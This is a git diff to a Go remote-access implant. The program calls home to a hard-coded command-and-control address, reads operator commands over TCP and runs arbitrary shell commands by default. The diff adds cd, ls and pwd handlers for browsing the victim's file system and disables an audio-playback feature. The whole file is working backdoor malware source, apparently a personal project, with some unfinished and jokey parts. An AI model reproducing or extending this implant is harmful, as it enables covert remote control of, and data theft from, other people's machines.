@@ -1,18 +1,18 @@
 package main
 
 import (
-	"bytes"
 	"fmt"
 	"net"
 	"os"
 	"os/exec"
+	"regexp"
+	"strings"
 	"syscall"
 	"time"
-
+	// "github.com/faiface/beep"
+	// "github.com/faiface/beep/mp3"
+	// "github.com/faiface/beep/speaker"
 	//"github.com/MarinX/keylogger"
-
-	"github.com/ebitengine/oto/v3"
-	"github.com/hajimehoshi/go-mp3"
 )
 
 func callHome(c2Address *string, attempts *int) (net.Conn, bool) {
@@ -86,76 +86,77 @@ func terminate() {
 	os.Exit(0)
 }
 
-// func cd(conn *net.Conn, command *string, pImplantWD *string) bool {
-// 	regexCD := regexp.MustCompile(`cd\s+.+`)
-// 	matchCD := regexCD.FindString(*command)
-// 	if matchCD != "" {
-// 		dir2go := strings.Split(matchCD, " ")[1]
-// 		// implantWD := os.Chdir(dir2go)
-// 		if os.Chdir(dir2go) != nil {
-// 			(*conn).Write([]byte("Error getting the dir\n"))
-// 		} else {
-// 			*pImplantWD, _ = os.Getwd()
-// 		}
-// 		return true
-// 	}
-// 	return false
-// }
-
-// func ls(conn *net.Conn, implantWD *string) {
-// 	dirFS, _ := os.ReadDir(*implantWD)
-// 	dirListing := ""
-// 	for e := range dirFS {
-// 		dirInfo, _ := dirFS[e].Info()
-// 		dirListing = dirListing + "		" + fmt.Sprint(dirInfo.Size()) + "		" + fmt.Sprint(dirInfo.Mode()) + "		" + dirInfo.Name() + "\n"
-// 	}
-// 	(*conn).Write([]byte("\n" + "		SIZE		" + "MODE		" + "	NAME" + "\n" +
-// 		"		----		" + "----		" + "	----" + "\n" +
-// 		dirListing + "\n")) //Looks funky but I want it organized
-// }
-
-func receiveNPlayAudio(conn *net.Conn) { //Needs some fixing
-	fmt.Println("Recieveing Audio ...")
-	music := make([]byte, 3145728) //Track limit is 3MB
-	read_len, err := (*conn).Read(music)
+func cd(conn *net.Conn, pImplantWD *string) {
+	buff := make([]byte, 99999)
+	read_len, err := (*conn).Read(buff)
 	if err != nil {
-		fmt.Println("Couldnt Play the Track")
+		fmt.Println("Something went wrong")
 		return
 	}
-	if read_len < 1 {
-		fmt.Println("Couldnt Play the Track")
+	if read_len <= 1 {
+		fmt.Println("Something went wrong")
 		return
 	}
-	musicCut := music[:read_len]
-	musicBytesReader := bytes.NewReader(musicCut)
-	decodedMp3, err := mp3.NewDecoder(musicBytesReader)
-	if err != nil {
-		fmt.Println("Audio Decoding Failed")
-		return
+	buffSnapped := buff[:read_len]
+	regexCD := regexp.MustCompile(`cd\s+.+`)
+	matchCD := regexCD.FindString(string(buffSnapped))
+	if matchCD != "" {
+		dir2go := strings.Split(matchCD, " ")[1]
+		// implantWD := os.Chdir(dir2go)
+		if os.Chdir(dir2go) != nil {
+			//(*conn).Write([]byte("Error getting the dir\n"))
+			fmt.Println("Couldn't find the dir")
+		} else {
+			*pImplantWD, _ = os.Getwd()
+			fmt.Println(*pImplantWD)
+			fmt.Println("Exiting")
+			//(*conn).Write([]byte(*pImplantWD + "\n"))
+		}
 	}
-	op := &oto.NewContextOptions{}
-	op.SampleRate = 44100
-	op.ChannelCount = 1
-	op.Format = oto.FormatSignedInt16LE
-	otoCtx, readyChan, err := oto.NewContext(op)
-	if err != nil {
-		fmt.Println("oto New Context failed")
-		return
-	}
-	<-readyChan
-	player := otoCtx.NewPlayer(decodedMp3)
-	player.Play()
-	//The play is async so we can comment out the below line if we want regulat execution even after returning
-	// for player.IsPlaying() {
-	// 	time.Sleep(5 * time.Second)
-	// }
-	err = player.Close()
 }
 
+func ls(conn *net.Conn, implantWD *string) {
+	dirFS, _ := os.ReadDir(*implantWD)
+	dirListing := ""
+	for e := range dirFS {
+		dirInfo, _ := dirFS[e].Info()
+		dirListing = dirListing + "		" + fmt.Sprint(dirInfo.Size()) + "		" + fmt.Sprint(dirInfo.Mode()) + "		" + dirInfo.Name() + "\n"
+	}
+	(*conn).Write([]byte("\n" + "		SIZE		" + "MODE		" + "	NAME" + "\n" +
+		"		----		" + "----		" + "	----" + "\n" +
+		dirListing + "\n")) //Looks funky but I want it organized
+}
+
+// func receiveNPlayAudio(conn *net.Conn) { //Needs some fixing
+// 	fmt.Println("Recieveing Audio ...")
+// 	music := make([]byte, 3145728) //Track limit is 3MB
+// 	read_len, err := (*conn).Read(music)
+// 	if err != nil {
+// 		fmt.Println("Couldnt Play the Track")
+// 		return
+// 	}
+// 	if read_len < 1 {
+// 		fmt.Println("Couldnt Play the Track")
+// 		return
+// 	}
+// 	musicCut := music[:read_len]
+// 	musicBytesReader := bytes.NewReader(musicCut)
+// 	streamer, format, err := mp3.Decode(musicBytesReader)
+// 	if err != nil {
+// 		fmt.Println("Something Wrong")
+// 	}
+// 	speaker.Init(format.SampleRate, format.SampleRate.N(time.Second/10))
+// 	buffer := beep.NewBuffer(format)
+// 	buffer.Append(streamer)
+// 	streamer.Close()
+// 	take := buffer.Streamer(0, buffer.Len())
+// 	speaker.Play(take)
+// }
+
 func main() {
-	c2Address := "192.168.5.222:1234"
+	c2Address := "192.168.5.222:321"
 	attempts := 0
-	//implantWD, _ := os.Getwd()
+	implantWD, _ := os.Getwd()
 	fmt.Println("Implant Started")
 	conn, result := callHome(&c2Address, &attempts)
 	// if !result {
@@ -182,17 +183,30 @@ func main() {
 				fmt.Println(output)
 				conn.Write([]byte("NoTime2Die\n"))
 			}
-		case "play\n":
-			{
-				receiveNPlayAudio(&conn) //Needs time 2 fix
-			}
+		// case "play\n":
+		// 	{
+		// 		receiveNPlayAudio(&conn) //Needs time 2 fix
+		// 	}
 		case "barCode\n":
 			{
 				barCodeLoad(&conn)
 			}
+		case "cd\n":
+			{
+				cd(&conn, &implantWD)
+			}
 		case "butterInjection\n":
 			{
 				fmt.Println("Chicken Kiev")
+			}
+		case "ls\n":
+			{
+				ls(&conn, &implantWD)
+			}
+		case "pwd\n":
+			{
+				fmt.Println(implantWD)
+				conn.Write([]byte(implantWD))
 			}
 		default: //TO-DO: turning the default into an error statement and appending all shell commands with a ">.<" to avoid crashes
 			executeCommands(&conn, &command)
